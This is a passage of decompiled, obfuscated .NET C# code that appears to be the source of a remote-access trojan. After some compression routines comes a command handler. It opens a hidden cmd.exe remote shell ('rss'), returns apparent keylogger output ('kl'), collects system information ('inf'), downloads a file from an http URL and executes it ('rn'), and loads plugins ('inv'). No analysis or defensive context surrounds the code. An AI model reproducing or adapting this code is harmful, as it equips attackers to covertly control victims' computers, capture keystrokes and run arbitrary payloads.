          \u0003.\u0004.\u0007.\u0001 obj7 = obj1.\u0001;
          short[] numArray2 = \u0003.\u0004.\u0007.\u0002;
          \u0006.\u0007.\u0001(\u0003.\u0004.\u0007.\u0003, numArray2, obj7);
          \u0003.\u0004.\u0007.\u0001 obj8 = obj1.\u0002;
          short[] numArray3 = \u0003.\u0004.\u0007.\u0003;
          \u0006.\u0007.\u0001(\u0003.\u0004.\u0007.\u0004, numArray3, obj8);
          \u0006.\u0007.\u0001(obj1);
          \u0006.\u0007.\u0001(obj1);
        }
        else
        {
          \u0006.\u0007.\u0001(obj1.\u0001, 4 + (obj3 ? 1 : 0), 3);
          \u0006.\u0007.\u0001(obj1, *(int*) voidPtr);
          \u0006.\u0007.\u0001(obj1);
          \u0006.\u0007.\u0001(obj1);
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[12]
        {
          (object) *(int*) voidPtr,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 20),
          (object) numArray1,
          (object) obj1,
          (object) obj2,
          (object) obj4,
          (object) obj0,
          (object) obj3
        };
        \u0006.\u0007.\u0001(ex, objArray);
        throw;
      }
    }

    static unsafe void \u0001([In] \u0003.\u0004.\u0007.\u0001 obj0, [In] \u0003.\u0004.\u0007.\u0001 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      short[] numArray1;
      IntPtr index;
      int num;
      try
      {
        *(int*) ((IntPtr) voidPtr + 8) = -1;
        *(int*) ((IntPtr) voidPtr + 12) = 0;
        while (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002)
        {
          num = 1;
          *(int*) ((IntPtr) voidPtr + 16) = (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)];
          if (*(int*) ((IntPtr) voidPtr + 16) != 0)
          {
            *(int*) voidPtr = 6;
            *(int*) ((IntPtr) voidPtr + 4) = 3;
            if (*(int*) ((IntPtr) voidPtr + 8) != *(int*) ((IntPtr) voidPtr + 16))
            {
              if (false)
                break;
              (numArray1 = obj0.\u0001)[(int) (index = (IntPtr) *(int*) ((IntPtr) voidPtr + 16))] = (short) ((int) numArray1[index] + 1);
              num = 0;
            }
          }
          else
            goto label_19;
label_7:
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 16);
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
          while (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002 && *(int*) ((IntPtr) voidPtr + 8) == (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)])
          {
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
            if (++num >= *(int*) voidPtr)
              break;
          }
          if (num < *(int*) ((IntPtr) voidPtr + 4))
          {
            (numArray1 = obj0.\u0001)[(int) (index = (IntPtr) *(int*) ((IntPtr) voidPtr + 8))] = (short) ((int) numArray1[index] + (int) (short) num);
            continue;
          }
          if (*(int*) ((IntPtr) voidPtr + 8) != 0)
          {
            (numArray1 = obj0.\u0001)[16] = (short) ((int) numArray1[16] + 1);
            continue;
          }
          if (num <= 10)
          {
            (numArray1 = obj0.\u0001)[17] = (short) ((int) numArray1[17] + 1);
            continue;
          }
          (numArray1 = obj0.\u0001)[18] = (short) ((int) numArray1[18] + 1);
          continue;
label_19:
          *(int*) voidPtr = 138;
          *(int*) ((IntPtr) voidPtr + 4) = 3;
          goto label_7;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) *(int*) ((IntPtr) voidPtr + 16);
        short[] numArray2 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local7 = (ValueType) index;
        \u0003.\u0004.\u0007.\u0001 obj2 = obj1;
        \u0003.\u0004.\u0007.\u0001 obj3 = obj0;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) numArray2, (object) local7, (object) obj2, (object) obj3);
        throw;
      }
    }

    static unsafe void \u0001([In] \u0003.\u0004.\u0007.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(36);
      int num1;
      int index1;
      int[] numArray1;
      int index2;
      int num2;
      int num3;
      int[] numArray2;
      int[] numArray3;
      int num4;
      int index3;
      int index4;
      int index5;
      int num5;
      try
      {
        *(int*) voidPtr = obj0.\u0001.Length;
        numArray1 = new int[*(int*) voidPtr];
        num1 = 0;
        num2 = 0;
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (*(int*) ((IntPtr) voidPtr + 4) < *(int*) voidPtr)
        {
          *(int*) ((IntPtr) voidPtr + 8) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
          if (*(int*) ((IntPtr) voidPtr + 8) != 0)
          {
            for (index1 = num1++; index1 > 0 && (int) obj0.\u0001[numArray1[index2 = (index1 - 1) / 2]] > *(int*) ((IntPtr) voidPtr + 8); index1 = index2)
              numArray1[index1] = numArray1[index2];
            numArray1[index1] = *(int*) ((IntPtr) voidPtr + 4);
            num2 = *(int*) ((IntPtr) voidPtr + 4);
          }
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
        }
        for (; num1 < 2; numArray1[num1++] = num3)
        {
          int num6;
          if (num2 >= 2)
            num6 = 0;
          else
            num2 = num6 = num2 + 1;
          num3 = num6;
        }
        obj0.\u0002 = Math.Max(num2 + 1, obj0.\u0001);
        *(int*) ((IntPtr) voidPtr + 12) = num1;
        int num7 = 4 * num1;
        if (true)
        {
          numArray2 = new int[num7 - 2];
          numArray3 = new int[2 * num1 - 1];
          num4 = *(int*) ((IntPtr) voidPtr + 12);
          *(int*) ((IntPtr) voidPtr + 16) = 0;
          while (*(int*) ((IntPtr) voidPtr + 16) < num1)
          {
            *(int*) ((IntPtr) voidPtr + 20) = numArray1[*(int*) ((IntPtr) voidPtr + 16)];
            numArray2[2 * *(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 20);
            numArray2[2 * *(int*) ((IntPtr) voidPtr + 16) + 1] = -1;
            numArray3[*(int*) ((IntPtr) voidPtr + 16)] = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 20)] << 8;
            numArray1[*(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 16);
            *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
          }
        }
        else
          goto label_25;
label_17:
        *(int*) ((IntPtr) voidPtr + 24) = numArray1[0];
        index3 = numArray1[--num1];
        index4 = 0;
        for (index5 = 1; index5 < num1; index5 = index5 * 2 + 1)
        {
          if (index5 + 1 < num1 && numArray3[numArray1[index5]] > numArray3[numArray1[index5 + 1]])
            ++index5;
          numArray1[index4] = numArray1[index5];
          index4 = index5;
        }
        num5 = numArray3[index3];
label_24:
        num7 = index5 = index4;
label_25:
        if (num7 > 0 && numArray3[numArray1[index4 = (index5 - 1) / 2]] > num5)
        {
          numArray1[index5] = numArray1[index4];
          goto label_24;
        }
        else
        {
          numArray1[index5] = index3;
          *(int*) ((IntPtr) voidPtr + 28) = numArray1[0];
          index3 = num4++;
          numArray2[2 * index3] = *(int*) ((IntPtr) voidPtr + 24);
          numArray2[2 * index3 + 1] = *(int*) ((IntPtr) voidPtr + 28);
          *(int*) ((IntPtr) voidPtr + 32) = Math.Min(numArray3[*(int*) ((IntPtr) voidPtr + 24)] & (int) byte.MaxValue, numArray3[*(int*) ((IntPtr) voidPtr + 28)] & (int) byte.MaxValue);
          numArray3[index3] = num5 = numArray3[*(int*) ((IntPtr) voidPtr + 24)] + numArray3[*(int*) ((IntPtr) voidPtr + 28)] - *(int*) ((IntPtr) voidPtr + 32) + 1;
          index4 = 0;
          for (index5 = 1; index5 < num1; index5 = index4 * 2 + 1)
          {
            if (index5 + 1 < num1 && numArray3[numArray1[index5]] > numArray3[numArray1[index5 + 1]])
              ++index5;
            numArray1[index4] = numArray1[index5];
            index4 = index5;
          }
          while ((index5 = index4) > 0 && numArray3[numArray1[index4 = (index5 - 1) / 2]] > num5)
            numArray1[index5] = numArray1[index4];
          numArray1[index5] = index3;
          if (num1 <= 1)
            \u0006.\u0007.\u0001(obj0, numArray2);
          else
            goto label_17;
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[23]
        {
          (object) *(int*) voidPtr,
          (object) numArray1,
          (object) num1,
          (object) num2,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) index1,
          (object) index2,
          (object) num3,
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) numArray2,
          (object) numArray3,
          (object) num4,
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 20),
          (object) *(int*) ((IntPtr) voidPtr + 24),
          (object) index3,
          (object) index4,
          (object) index5,
          (object) num5,
          (object) *(int*) ((IntPtr) voidPtr + 28),
          (object) *(int*) ((IntPtr) voidPtr + 32),
          (object) obj0
        };
        \u0006.\u0007.\u0001(ex, objArray);
        throw;
      }
    }

    static int \u0001([In] \u0003.\u0004.\u0002 obj0, [In] int obj1)
    {
      int num1;
      try
      {
        if (obj0.\u0003 < obj1)
          goto label_5;
label_4:
        return (int) ((long) obj0.\u0001 & (long) ((1 << obj1) - 1));
label_5:
        if (obj0.\u0001 == obj0.\u0002)
          return -1;
        \u0003.\u0004.\u0002 obj2 = obj0;
        int num2 = (int) obj2.\u0001;
        byte[] numArray1 = obj0.\u0001;
        \u0003.\u0004.\u0002 obj3 = obj0;
        int num3 = obj3.\u0001;
        if (true)
          goto label_6;
label_3:
        obj3.\u0001 = num3 + 1;
        int index1 = num1;
        int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
        byte[] numArray2 = obj0.\u0001;
        num1 = obj0.\u0001++;
        int index2 = num1;
        int num5 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
        int num6 = (num4 | num5) << obj0.\u0003;
        obj2.\u0001 = (uint) (num2 | num6);
        obj0.\u0003 += 16;
        goto label_4;
label_6:
        num1 = num3;
        goto label_3;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u0003.\u0004.\u0002 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) obj, (object) local2);
        throw;
      }
    }

    static void \u0001([In] Exception obj0) => \u0006.\u0007.\u0001(obj0, new object[0]);

    static unsafe void \u0001([In] byte[] obj0, [In] \u0001 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(17);
      char[] chArray1;
      Exception exception1;
      object[] objArray1;
      string str1;
      string[] strArray1;
      Exception exception2;
      char[] chArray2;
      string str2;
      string str3;
      string str4;
      string[] strArray2;
      string str5;
      byte[] numArray1;
      object obj2;
      object[] objArray2;
      bool[] flagArray1;
      string str6;
      string str7;
      byte[] numArray2;
      object obj3;
      string str8;
      byte[] numArray3;
      object obj4;
      Rectangle rectangle1;
      Rectangle rectangle2;
      Bitmap bitmap;
      Graphics graphics1;
      Size size1;
      Exception exception3;
      MemoryStream memoryStream1;
      MemoryStream memoryStream2;
      IntPtr num1;
      string str9;
      object obj5;
      object[] objArray3;
      byte[] numArray4;
      object obj6;
      string str10;
      object obj7;
      string str11;
      string str12;
      string str13;
      IEnumerator enumerator1;
      string str14;
      IEnumerator enumerator2;
      string str15;
      object[] objArray4;
      bool[] flagArray2;
      Exception exception4;
      Exception exception5;
      try
      {
        strArray1 = \u0018\u0002.\u008B\u0004(\u0006.\u0007.\u0001(obj1, ref obj0), obj1.\u000E, -1, CompareMethod.Binary);
        try
        {
          str1 = strArray1[0];
          \u001C obj8 = \u001C.\u0098;
          string str16 = str1;
          chArray1 = new char[3]{ 'r', 's', 's' };
          string str17 = new string(chArray1);
          if (obj8(str16, str17, false) == 0)
          {
            try
            {
              object obj9 = \u0011.\u001A(obj1.\u0002, (System.Type) null, \u0006.\u0007.\u001F(625), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              exception1 = ex;
              global::\u0006.\u0006();
            }
            if (true)
            {
              obj1.\u0002 = (object) new Process();
              global::\u0003 obj10 = global::\u0003.\u0003;
              object obj11 = \u0001.\u0001(obj1.\u0002, (System.Type) null, \u0006.\u0007.\u001F(2741), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
              string str18 = \u0006.\u0007.\u001F(2754);
              objArray1 = new object[1]{ (object) true };
              object[] objArray5 = objArray1;
              obj10(obj11, (System.Type) null, str18, objArray5, (string[]) null, (System.Type[]) null, false, true);
              global::\u0003 obj12 = global::\u0003.\u0003;
              object obj13 = \u0001.\u0001(obj1.\u0002, (System.Type) null, \u0006.\u0007.\u001F(2741), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
              string str19 = \u0006.\u0007.\u001F(2787);
              objArray1 = new object[1]{ (object) true };
              object[] objArray6 = objArray1;
              obj12(obj13, (System.Type) null, str19, objArray6, (string[]) null, (System.Type[]) null, false, true);
              global::\u0003 obj14 = global::\u0003.\u0003;
              object obj15 = \u0001.\u0001(obj1.\u0002, (System.Type) null, \u0006.\u0007.\u001F(2741), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
              string str20 = \u0006.\u0007.\u001F(2816);
              objArray1 = new object[1]{ (object) true };
              object[] objArray7 = objArray1;
              obj14(obj15, (System.Type) null, str20, objArray7, (string[]) null, (System.Type[]) null, false, true);
              global::\u0003 obj16 = global::\u0003.\u0003;
              object obj17 = \u0001.\u0001(obj1.\u0002, (System.Type) null, \u0006.\u0007.\u001F(2741), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
              string str21 = \u0006.\u0007.\u001F(2845);
              objArray1 = new object[1];
              object[] objArray8 = objArray1;
              chArray1 = new char[7]
              {
                'c',
                'm',
                'd',
                '.',
                'e',
                'x',
                'e'
              };
              char[] chArray3 = chArray1;
              objArray8[0] = (object) chArray3;
              object[] objArray9 = objArray1;
              obj16(obj17, (System.Type) null, str21, objArray9, (string[]) null, (System.Type[]) null, false, true);
              global::\u0003 obj18 = global::\u0003.\u0003;
              object obj19 = \u0001.\u0001(obj1.\u0002, (System.Type) null, \u0006.\u0007.\u001F(2741), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
              string str22 = \u0006.\u0007.\u001F(2816);
              objArray1 = new object[1]{ (object) true };
              object[] objArray10 = objArray1;
              obj18(obj19, (System.Type) null, str22, objArray10, (string[]) null, (System.Type[]) null, false, true);
              \u0006\u0003.\u007E\u008A\u0005((object) (Process) obj1.\u0002, new DataReceivedEventHandler(obj1.\u0001));
              \u0006\u0003.\u007E\u008B\u0005((object) (Process) obj1.\u0002, new DataReceivedEventHandler(obj1.\u0001));
              \u0010\u0002.\u007E\u0019\u0004((object) (Process) obj1.\u0002, new EventHandler(obj1.\u0001));
              global::\u0003 obj20 = global::\u0003.\u0003;
              object obj21 = \u0001.\u0001(obj1.\u0002, (System.Type) null, \u0006.\u0007.\u001F(2741), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
              string str23 = \u0006.\u0007.\u001F(2858);
              objArray1 = new object[1]{ (object) false };
              object[] objArray11 = objArray1;
              obj20(obj21, (System.Type) null, str23, objArray11, (string[]) null, (System.Type[]) null, false, true);
              global::\u0003 obj22 = global::\u0003.\u0003;
              object obj23 = \u0001.\u0001(obj1.\u0002, (System.Type) null, \u0006.\u0007.\u001F(2741), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
              string str24 = \u0006.\u0007.\u001F(2879);
              objArray1 = new object[1]{ (object) true };
              object[] objArray12 = objArray1;
              obj22(obj23, (System.Type) null, str24, objArray12, (string[]) null, (System.Type[]) null, false, true);
              global::\u0003 obj24 = global::\u0003.\u0003;
              object obj25 = \u0001.\u0001(obj1.\u0002, (System.Type) null, \u0006.\u0007.\u001F(2741), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
              string str25 = \u0006.\u0007.\u001F(2900);
              objArray1 = new object[1]
              {
                (object) ProcessWindowStyle.Hidden
              };
              object[] objArray13 = objArray1;
              obj24(obj25, (System.Type) null, str25, objArray13, (string[]) null, (System.Type[]) null, false, true);
              \u001B obj26 = \u001B.\u0097;
              object obj27 = obj1.\u0002;
              string str26 = \u0006.\u0007.\u001F(2917);
              objArray1 = new object[1]{ (object) true };
              object[] objArray14 = objArray1;
              obj26(obj27, (System.Type) null, str26, objArray14, (string[]) null, (System.Type[]) null);
              \u0001 obj28 = obj1;
              chArray1 = new char[3]{ 'r', 's', 's' };
              string str27 = new string(chArray1);
              \u0006.\u0007.\u0001(obj28, str27);
              object obj29 = \u0011.\u001A(obj1.\u0002, (System.Type) null, \u0006.\u0007.\u001F(2495), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              object obj30 = \u0011.\u001A(obj1.\u0002, (System.Type) null, \u0006.\u0007.\u001F(2946), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              object obj31 = \u0011.\u001A(obj1.\u0002, (System.Type) null, \u0006.\u0007.\u001F(2971), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              return;
            }
          }
          else
          {
            \u001C obj32 = \u001C.\u0098;
            string str28 = str1;
            chArray1 = new char[2]{ 'r', 's' };
            string str29 = new string(chArray1);
            if (obj32(str28, str29, false) == 0)
            {
              \u0011 obj33 = \u0011.\u001A;
              object obj34 = \u0001.\u0001(obj1.\u0002, (System.Type) null, \u0006.\u0007.\u001F(3000), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
              string str30 = \u0006.\u0007.\u001F(3021);
              objArray1 = new object[1]
              {
                (object) \u0006.\u0007.\u0001(obj1, ref strArray1[1])
              };
              object[] objArray15 = objArray1;
              object obj35 = obj33(obj34, (System.Type) null, str30, objArray15, (string[]) null, (System.Type[]) null, (bool[]) null, true);
              return;
            }
            \u001C obj36 = \u001C.\u0098;
            string str31 = str1;
            chArray1 = new char[3]{ 'r', 's', 'c' };
            string str32 = new string(chArray1);
            if (obj36(str31, str32, false) == 0)
            {
              try
              {
                object obj37 = \u0011.\u001A(obj1.\u0002, (System.Type) null, \u0006.\u0007.\u001F(625), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                exception2 = ex;
                global::\u0006.\u0006();
              }
              obj1.\u0002 = (object) null;
              return;
            }
            \u001C obj38 = \u001C.\u0098;
            string str33 = str1;
            chArray1 = new char[2]{ 'k', 'l' };
            string str34 = new string(chArray1);
            if (obj38(str33, str34, false) == 0)
            {
              \u0001 obj39 = obj1;
              chArray2 = new char[2]{ 'k', 'l' };
              string str35 = global::\u0004.\u0004(new string(chArray2), obj1.\u000E, \u0006.\u0007.\u0001(obj1, ref obj1.\u0001.\u0002));
              \u0006.\u0007.\u0001(obj39, str35);
              return;
            }
            \u001C obj40 = \u001C.\u0098;
            string str36 = str1;
            chArray2 = new char[3]{ 'i', 'n', 'f' };
            string str37 = new string(chArray2);
            if (obj40(str36, str37, false) == 0)
            {
              chArray1 = new char[3]{ 'i', 'n', 'f' };
              str2 = \u001D.\u0099(new string(chArray1), obj1.\u000E);
              if (\u001C.\u0098(\u0006.\u0007.\u0001(obj1, \u0006.\u0007.\u001F(926)), \u0006.\u0007.\u001F(379), false) == 0)
              {
                global::\u0004 obj41 = global::\u0004.\u0004;
                string str38 = str2;
                \u0001 obj42 = obj1;
                global::\u0004 obj43 = global::\u0004.\u0004;
                string str39 = \u0006.\u0007.\u0001(obj1, ref obj1.\u0001);
                chArray2 = new char[1]{ '_' };
                string str40 = new string(chArray2);
                string str41 = \u0006.\u0007.\u0001(obj1);
                str3 = obj43(str39, str40, str41);
                ref string local = ref str3;
                string str42 = \u0006.\u0007.\u0001(obj42, ref local);
                string str43 = obj1.\u000E;
                str2 = obj41(str38, str42, str43);
              }
              else
              {
                global::\u0004 obj44 = global::\u0004.\u0004;
                string str44 = str2;
                \u0001 obj45 = obj1;
                global::\u0004 obj46 = global::\u0004.\u0004;
                \u0001 obj47 = obj1;
                str3 = \u0006.\u0007.\u0001(obj1, \u0006.\u0007.\u001F(926));
                ref string local1 = ref str3;
                string str45 = \u0006.\u0007.\u0001(obj47, ref local1);
                string str46 = \u0006.\u0007.\u001F(931);
                string str47 = \u0006.\u0007.\u0001(obj1);
                str4 = obj46(str45, str46, str47);
                ref string local2 = ref str4;
                string str48 = \u0006.\u0007.\u0001(obj45, ref local2);
                string str49 = obj1.\u000E;
                str2 = obj44(str44, str48, str49);
              }
              strArray2 = new string[5]
              {
                str2,
                obj1.\u0007,
                null,
                null,
                null
              };
              string[] strArray3 = strArray2;
              chArray2 = new char[1]{ ':' };
              string str50 = new string(chArray2);
              strArray3[2] = str50;
              strArray2[3] = obj1.\u0008;
              strArray2[4] = obj1.\u000E;
              str2 = \u0091\u0002.\u0010\u0005(strArray2);
              str2 = global::\u0004.\u0004(str2, obj1.\u0005, obj1.\u000E);
              str2 = global::\u0004.\u0004(str2, obj1.\u0004, obj1.\u000E);
              str2 = \u001D.\u0099(str2, \u001E.\u007E\u000E\u0002((object) \u0003\u0002.\u009E\u0003()));
              \u0006.\u0007.\u0001(obj1, str2);
              return;
            }
            \u001C obj48 = \u001C.\u0098;
            string str51 = str1;
            chArray2 = new char[4]{ 'p', 'r', 'o', 'f' };
            string str52 = new string(chArray2);
            if (obj48(str51, str52, false) == 0)
            {
              str5 = strArray1[1];
              \u001C obj49 = \u001C.\u0098;
              string str53 = str5;
              chArray1 = new char[1]{ '~' };
              string str54 = new string(chArray1);
              if (obj49(str53, str54, false) == 0)
              {
                \u0006.\u0007.\u0001(obj1, strArray1[2], strArray1[3]);
                return;
              }
              \u001C obj50 = \u001C.\u0098;
              string str55 = str5;
              chArray2 = new char[1]{ '!' };
              string str56 = new string(chArray2);
              if (obj50(str55, str56, false) == 0)
              {
                \u0006.\u0007.\u0001(obj1, strArray1[2], strArray1[3]);
                \u0001 obj51 = obj1;
                strArray2 = new string[5];
                string[] strArray4 = strArray2;
                chArray2 = new char[8]
                {
                  'g',
                  'e',
                  't',
                  'v',
                  'a',
                  'l',
                  'u',
                  'e'
                };
                string str57 = new string(chArray2);
                strArray4[0] = str57;
                strArray2[1] = obj1.\u000E;
                strArray2[2] = strArray1[1];
                strArray2[3] = obj1.\u000E;
                strArray2[4] = \u0006.\u0007.\u0001(obj1, strArray1[1]);
                string str58 = \u0091\u0002.\u0010\u0005(strArray2);
                \u0006.\u0007.\u0001(obj51, str58);
                return;
              }
              \u001C obj52 = \u001C.\u0098;
              string str59 = str5;
              chArray2 = new char[1]{ '~' };
              string str60 = new string(chArray2);
              if (obj52(str59, str60, false) != 0)
                return;
              \u0006.\u0007.\u0001(strArray1[2], obj1);
              return;
            }
            \u001C obj53 = \u001C.\u0098;
            string str61 = str1;
            chArray2 = new char[2]{ 'r', 'n' };
            string str62 = new string(chArray2);
            if (obj53(str61, str62, false) == 0)
            {
              numArray1 = (byte[]) null;
              \u0015 obj54 = \u0015.\u007E\u0080;
              string str63 = \u001E.\u007E\u009C((object) strArray1[2]);
              chArray2 = new char[4]{ 'h', 't', 't', 'p' };
              string str64 = new string(chArray2);
              if (!obj54((object) str63, str64))
              {
                \u0001 obj55 = obj1;
                byte[] numArray5 = \u0093.\u0014\u0003(strArray1[2]);
                *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) 0;
                IntPtr num2 = (IntPtr) voidPtr + 16;
                // ISSUE: cast to a reference type
                numArray1 = \u0006.\u0007.\u0001(obj55, numArray5, (bool&) num2);
              }
              else
              {
                obj2 = (object) new WebClient();
                \u0001 obj56 = \u0001.\u0001;
                object obj57 = obj2;
                string str65 = \u0006.\u0007.\u001F(3034);
                objArray1 = new object[1];
                object[] objArray16 = objArray1;
                string[] strArray5 = strArray1;
                *(int*) ((IntPtr) voidPtr + 4) = 2;
                int index = *(int*) ((IntPtr) voidPtr + 4);
                string str66 = strArray5[index];
                objArray16[0] = (object) str66;
                objArray2 = objArray1;
                object[] objArray17 = objArray2;
                flagArray1 = new bool[1]{ true };
                bool[] flagArray3 = flagArray1;
                object obj58 = obj56(obj57, (System.Type) null, str65, objArray17, (string[]) null, (System.Type[]) null, flagArray3);
                if (flagArray1[0])
                {
                  // ISSUE: type reference
                  strArray1[*(int*) ((IntPtr) voidPtr + 4)] = (string) \u0014.\u001D(\u0012.\u001B(objArray2[0]), \u0013.\u001C(__typeref (string)));
                }
                numArray1 = (byte[]) obj58;
              }
              \u0001 obj59 = obj1;
              chArray2 = new char[3]{ 'b', 'l', 'a' };
              string str67 = new string(chArray2);
              \u0006.\u0007.\u0001(obj59, str67);
              strArray2 = new string[5]
              {
                \u007F.\u001C\u0002(\u0006.\u0007.\u001F(3051)),
                \u0006.\u0007.\u001F(834),
                \u0006.\u0007.\u0001(10, obj1),
                \u0006.\u0007.\u001F(3060),
                strArray1[1]
              };
              str6 = \u0091\u0002.\u0010\u0005(strArray2);
              \u0007\u0003.\u008C\u0005(str6, numArray1);
              Process process = \u0008\u0003.\u008D\u0005(str6);
              return;
            }
            \u001C obj60 = \u001C.\u0098;
            string str68 = str1;
            chArray2 = new char[3]{ 'i', 'n', 'v' };
            string str69 = new string(chArray2);
            if (obj60(str68, str69, false) == 0)
            {
              \u0001 obj61 = obj1;
              chArray1 = new char[3]{ 'b', 'l', 'a' };
              string str70 = new string(chArray1);
              \u0006.\u0007.\u0001(obj61, str70);
              str7 = \u0006.\u0007.\u0001(obj1, strArray1[1]);
              if (\u0018.\u007E\u0084((object) str7) > 0)
              {
                numArray2 = \u0093.\u0014\u0003(str7);
                \u0001 obj62 = obj1;
                strArray2 = new string[5];
                string[] strArray6 = strArray2;
                chArray2 = new char[2]{ 'p', 'l' };
                string str71 = new string(chArray2);
                strArray6[0] = str71;
                strArray2[1] = obj1.\u000E;
                strArray2[2] = strArray1[1];
                strArray2[3] = obj1.\u000E;
                strArray2[4] = \u0086\u0002.\u009D\u0004(0);
                string str72 = \u0091\u0002.\u0010\u0005(strArray2);
                \u0006.\u0007.\u0001(obj62, str72);
              }
              else
              {
                if (\u0018.\u007E\u0084((object) strArray1[3]) == 1)
                {
                  \u0001 obj63 = obj1;
                  strArray2 = new string[5]
                  {
                    \u0006.\u0007.\u001F(3065),
                    obj1.\u000E,
                    strArray1[1],
                    obj1.\u000E,
                    \u0006.\u0007.\u001F(3070)
                  };
                  string str73 = \u0091\u0002.\u0010\u0005(strArray2);
                  \u0006.\u0007.\u0001(obj63, str73);
                  return;
                }
                \u0001 obj64 = obj1;
                byte[] numArray6 = \u0093.\u0014\u0003(strArray1[3]);
                *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) 0;
                IntPtr num3 = (IntPtr) voidPtr + 16;
                // ISSUE: cast to a reference type
                numArray2 = \u0006.\u0007.\u0001(obj64, numArray6, (bool&) num3);
                if (\u000F.\u0018(\u0006.\u0007.\u0001(obj1, strArray1[1], \u000E\u0003.\u008E\u0005(numArray2))))
                {
                  \u0001 obj65 = obj1;
                  strArray2 = new string[5];
                  string[] strArray7 = strArray2;
                  chArray2 = new char[2]{ 'p', 'l' };
                  string str74 = new string(chArray2);
                  strArray7[0] = str74;
                  strArray2[1] = obj1.\u000E;
                  strArray2[2] = strArray1[1];
                  strArray2[3] = obj1.\u000E;
                  strArray2[4] = \u0086\u0002.\u009D\u0004(0);
                  string str75 = \u0091\u0002.\u0010\u0005(strArray2);
                  \u0006.\u0007.\u0001(obj65, str75);
                }
              }
              \u0012 obj66 = \u0012.\u001B;
              \u0001 obj67 = obj1;
              byte[] numArray7 = numArray2;
              chArray2 = new char[1]{ 'A' };
              string str76 = new string(chArray2);
              object obj68 = \u0006.\u0007.\u0001(obj67, numArray7, str76);
              obj3 = obj66(obj68);
              \u001B obj69 = \u001B.\u0097;
              object obj70 = obj3;
              string str77 = \u0006.\u0007.\u001F(3079);
              objArray2 = new object[1]
              {
                (object) obj1.\u0007
              };
              object[] objArray18 = objArray2;
              obj69(obj70, (System.Type) null, str77, objArray18, (string[]) null, (System.Type[]) null);
              \u001B obj71 = \u001B.\u0097;
              object obj72 = obj3;
              string str78 = \u0006.\u0007.\u001F(3084);
              objArray2 = new object[1]
              {
                (object) obj1.\u0008
              };
              object[] objArray19 = objArray2;
              obj71(obj72, (System.Type) null, str78, objArray19, (string[]) null, (System.Type[]) null);
            }
            else
            {
              \u001C obj73 = \u001C.\u0098;
              string str79 = str1;
              chArray2 = new char[3]{ 'r', 'e', 't' };
              string str80 = new string(chArray2);
              if (obj73(str79, str80, false) == 0)
              {
                \u0001 obj74 = obj1;
                chArray1 = new char[3]{ 'b', 'l', 'a' };
